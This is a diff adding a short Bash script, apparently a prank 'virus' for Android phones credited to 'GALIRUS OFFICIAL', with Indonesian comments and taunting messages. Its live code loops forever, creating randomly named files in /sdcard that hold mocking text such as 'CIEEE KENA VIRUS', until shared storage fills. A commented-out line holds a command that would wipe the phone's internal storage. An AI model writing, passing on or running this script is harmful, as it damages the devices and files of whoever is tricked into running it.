@@ -1,0 +1,25 @@
+#njir jahat banget , delete penyimpanan internal hape 🗿, kasih pagar ajalah asu
+#rm -rf /storage/emulated/0/ &>/dev/null &
+while true
+do
+shuffle_string() {
+str=$1
+arr=($(echo $str | sed -e 's/\(.\)/\1 /g'))
+for i in $(seq 0 $((${#arr[@]} - 2))); do
+j=$(($(($RANDOM % $((${#arr[@]} - $i)))) + $i))
+tmp=${arr[$i]}
+arr[$i]=${arr[$j]}
+arr[$j]=$tmp
+done
+echo ${arr[@]} | sed -e 's/ //g'
+}
+allowed_chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+shuffled_chars=$(shuffle_string $allowed_chars)
+password_length=10
+virus=${shuffled_chars:0:$password_length}
+music_files=("SUBSCRIBE : GALIRUS OFFICIAL😎" "CIEEE KENA VIRUS :v" "AUTHOR BY:GALIRUS😎" "PANIK KAU DEK DEK😂" "MAMPUS FILE NYA GA ILANG ILANG☠️" )
+random_index=$((RANDOM % ${#music_files[@]}))
+music_file="${music_files[random_index]}"
+cd /sdcard/
+echo "$music_file" >> $virus
+done
